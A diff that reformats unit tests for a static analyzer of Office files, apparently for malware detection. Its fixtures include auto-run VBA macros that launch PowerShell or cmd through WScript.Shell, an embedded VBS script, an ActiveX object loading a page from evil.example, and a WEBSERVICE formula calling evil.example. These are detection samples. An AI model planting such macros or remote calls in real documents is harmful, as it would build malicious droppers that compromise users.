@@ -115,10 +115,10 @@ class StaticAnalyzerTests(unittest.TestCase):
                         "</Relationships>"
                     ),
                     "word/vbaProject.bin": (
-                        'Sub AutoOpen()\n'
-                        'CreateObject("WScript.Shell").Run "powershell -enc AAAA"\n'
-                        "End Sub"
-                    ).encode(),
+                        b"Sub AutoOpen()\n"
+                        b'CreateObject("WScript.Shell").Run "powershell -enc AAAA"\n'
+                        b"End Sub"
+                    ),
                 },
             )
             result = AnalyzerEngine(skip_yara=True).analyze_file(sample)
@@ -198,7 +198,7 @@ class StaticAnalyzerTests(unittest.TestCase):
                     "word/activeX/activeX1.xml": (
                         '<ax:ocx ax:classid="{D27CDB6E-AE6D-11cf-96B8-444553540000}" '
                         'xmlns:ax="http://schemas.microsoft.com/office/2006/activeX">'
-                        "<ax:ocxPr ax:name=\"HTMLFile\" ax:value=\"mshtml:http://evil.example/payload.html\"/>"
+                        '<ax:ocxPr ax:name="HTMLFile" ax:value="mshtml:http://evil.example/payload.html"/>'
                         "</ax:ocx>"
                     ),
                 },
@@ -217,16 +217,20 @@ class StaticAnalyzerTests(unittest.TestCase):
                     build_ooxml_package(
                         sample,
                         {
-                            "xl/workbook.bin" if file_name.endswith(".xlsb") else "xl/workbook.xml": (
+                            "xl/workbook.bin"
+                            if file_name.endswith(".xlsb")
+                            else "xl/workbook.xml": (
                                 '<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"/>'
                             ),
-                            "xl/vbaProject.bin": b"Sub Auto_Open()\nShell \"cmd.exe\"\nEnd Sub",
+                            "xl/vbaProject.bin": b'Sub Auto_Open()\nShell "cmd.exe"\nEnd Sub',
                         },
                     )
                     result = AnalyzerEngine(skip_yara=True).analyze_file(sample)
 
                 self.assertEqual(result.file_type, "ooxml_xlsm")
-                self.assertTrue(any(finding.title == "VBA Macros Present" for finding in result.findings))
+                self.assertTrue(
+                    any(finding.title == "VBA Macros Present" for finding in result.findings)
+                )
 
     def test_excel_connections_formulas_and_hidden_sheets_are_flagged(self) -> None:
         with tempfile.TemporaryDirectory() as temp_dir:
@@ -241,10 +245,10 @@ class StaticAnalyzerTests(unittest.TestCase):
                     ),
                     "xl/worksheets/sheet1.xml": (
                         '<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
-                        "<sheetData><row><c><f>WEBSERVICE(\"http://evil.example/a\")</f></c></row></sheetData>"
+                        '<sheetData><row><c><f>WEBSERVICE("http://evil.example/a")</f></c></row></sheetData>'
                         "</worksheet>"
                     ),
-                    "xl/connections.xml": "<connections><connection name=\"remote\"/></connections>",
+                    "xl/connections.xml": '<connections><connection name="remote"/></connections>',
                     "xl/externalLinks/externalLink1.xml": "<externalLink/>",
                 },
             )
@@ -262,7 +266,9 @@ class StaticAnalyzerTests(unittest.TestCase):
             sample = Path(temp_dir) / "embedded.docx"
             build_ooxml(
                 sample,
-                {"word/embeddings/payload.vbs": 'CreateObject("WScript.Shell").Run "cmd.exe /c calc"'},
+                {
+                    "word/embeddings/payload.vbs": 'CreateObject("WScript.Shell").Run "cmd.exe /c calc"'
+                },
             )
             result = AnalyzerEngine(skip_yara=True).analyze_file(sample)
 
@@ -273,7 +279,7 @@ class StaticAnalyzerTests(unittest.TestCase):
     def test_ole_helper_flags_vba_objectpool_and_activex(self) -> None:
         class FakeStream:
             def read(self) -> bytes:
-                return b"Sub AutoOpen()\nCreateObject(\"WScript.Shell\")\nEnd Sub"
+                return b'Sub AutoOpen()\nCreateObject("WScript.Shell")\nEnd Sub'
 
         class FakeOLE:
             def listdir(self, streams=True, storages=False):
